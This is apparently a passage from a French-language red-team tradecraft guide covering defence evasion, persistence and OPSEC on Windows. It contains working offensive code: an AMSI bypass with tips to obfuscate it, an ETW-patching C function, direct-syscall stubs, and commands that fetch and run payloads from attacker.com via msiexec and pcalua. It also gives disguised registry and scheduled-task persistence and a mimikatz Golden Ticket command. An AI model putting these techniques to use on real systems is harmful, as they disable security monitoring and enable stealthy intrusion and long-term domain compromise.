Phase 3 : Execution & Evasion

L'évasion EDR/AV arrive très vite dans une opération Red Team moderne.

AMSI Bypass

AMSI (Antimalware Scan Interface) inspecte les scripts PowerShell et .NET avant exécution. La technique la plus stable consiste à forcer amsiInitFailed à true via réflexion, ce qui désactive les scans pour le processus courant :

# Patch amsiInitFailed via réflexion .NET (PowerShell)
$a = [Ref].Assembly.GetTypes()
$b = $a | Where-Object { $_.Name -like "*iUtils" }
$c = $b.GetFields('NonPublic,Static')
$d = $c | Where-Object { $_.Name -like "*itFailed" }
$d.SetValue($null, $true)
# → AMSI désactivé pour ce processus PowerShell
Obfuscation : Les signatures AMSI se basent sur les noms de champs. Séparer les chaînes ("amsi" + "InitFailed"), utiliser des variables intermédiaires ou encoder en Base64/XOR pour éviter les détections statiques sur ce pattern.

ETW Patching

ETW (Event Tracing for Windows) alimente les EDR en télémétrie depuis ntdll.dll. Patcher EtwEventWrite avec un ret immédiat coupe cette télémétrie pour le processus courant :

// ETW patch : écraser EtwEventWrite avec "ret" (C)
void patch_etw() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    FARPROC etw_write = GetProcAddress(ntdll, "EtwEventWrite");

    DWORD old_protect;
    VirtualProtect(etw_write, 1, PAGE_EXECUTE_READWRITE, &old_protect);
    *(BYTE*)etw_write = 0xC3;  // opcode RET
    VirtualProtect(etw_write, 1, old_protect, &old_protect);
}

Direct Syscalls (SysWhispers / Hell's Gate)

Les EDR hookent les fonctions de ntdll.dll (NtAllocateVirtualMemory, NtWriteVirtualMemory, etc.) pour intercepter les appels suspects. Appeler les syscalls directement, sans passer par ntdll, contourne ces hooks. SysWhispers3 génère les stubs automatiquement :

// Stub généré par SysWhispers : NtAllocateVirtualMemory
// Le numéro de syscall est résolu au runtime
// (Hell's Gate : lire le numéro depuis le ntdll non patché en mémoire)

NtAllocateVirtualMemory_syscall:
    mov r10, rcx
    mov eax, [résolu au runtime]      ; numéro syscall réel
    syscall
    ret

Callback/Sleep Obfuscation

Les EDR modernes scannent la mémoire des processus pendant les périodes d'inactivité du beacon (sleep). L'obfuscation de callback chiffre le shellcode en mémoire entre chaque check-in et le déchiffre uniquement pendant l'exécution. Ekko et Foliage utilisent des timers Windows comme vecteur de déchiffrement :

// Principe Ekko : chiffrer la région du beacon pendant le sleep
// 1. Enregistrer un timer APC via CreateTimewaitableTimer
// 2. Le callback déchiffre la région (XOR/RC4) juste avant le réveil
// 3. Pendant le sleep, le scanner EDR voit du bruit chiffré

// Dans Havoc / Sliver : activer via le profil de l'agent
// Havoc : set Sleep 60 + set Jitter 20 + set Indirect true
// Sliver : implant generate --os windows --sleep 60s --jitter 30

Living Off The Land (LOLBins)

Les LOLBins classiques (certutil, mshta, MSBuild) sont massivement détectés en 2026. Préférer des vecteurs moins surveillés :

# msiexec : exécution via MSI distant (moins détecté que certutil)
msiexec /q /i http://attacker.com/payload.msi

# pcalua : proxy d'exécution via Program Compatibility Assistant
pcalua -a \\attacker.com\share\payload.exe

# forfiles : exécution indirecte via énumération de fichiers
forfiles /p C:\Windows\System32 /m notepad.exe /c "cmd /c payload.exe"

# MSDTC (COM surrogate) : exécution via service légitime
# Référence : LOLBAS : vérifier le statut détection avant usage en mission
Règle opérationnelle : Toujours vérifier le statut de détection d'un LOLBin sur LOLBAS Project avant utilisation. La majorité des SIEM règlent désormais des alertes sur les techniques documentées publiquement.

Phase 6 : Persistance

La persistance assure le maintien de l'accès même après un reboot ou une réponse incident partielle.

Technique MITRE ID Localisation
Registry Run Keys T1547.001 HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Scheduled Task T1053.005 Task Scheduler
Create Account T1136 Utilisateur local/domaine caché
Server Software Component: Web Shell T1505.003 Serveurs web compromis
Boot or Logon Autostart: Startup Folder T1547.001 %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup 
# Persistance via Registry (détectable)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Users\Public\update.exe"

# Scheduled Task (plus discret)
schtasks /create /tn "MicrosoftEdgeUpdateCore" /tr "C:\Users\Public\update.exe" /sc onlogon /ru SYSTEM

# Golden Ticket (persistance domaine ultime)
# Nécessite le hash KRBTGT
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:hash /ptt
Golden Ticket - Un Golden Ticket reste valide jusqu'à ce que le mot de passe KRBTGT soit changé deux fois. C'est la persistance la plus puissante sur un domaine AD.

OPSEC : Règles d'or

  1. Blending in : Imiter le trafic réseau légitime (horaires de bureau, User-Agents réalistes)
  2. Minimiser l'empreinte : Éviter d'écrire sur disque, utiliser le reflective loading
  3. Segmenter l'infrastructure : Redirecteurs → Team servers → Backend
  4. Chiffrer tout : Communications C2, données exfiltrées
  5. Surveiller les IOCs : Vérifier régulièrement si votre infrastructure est flaggée
  6. Kill dates : Implants qui s'auto-détruisent après une date limite
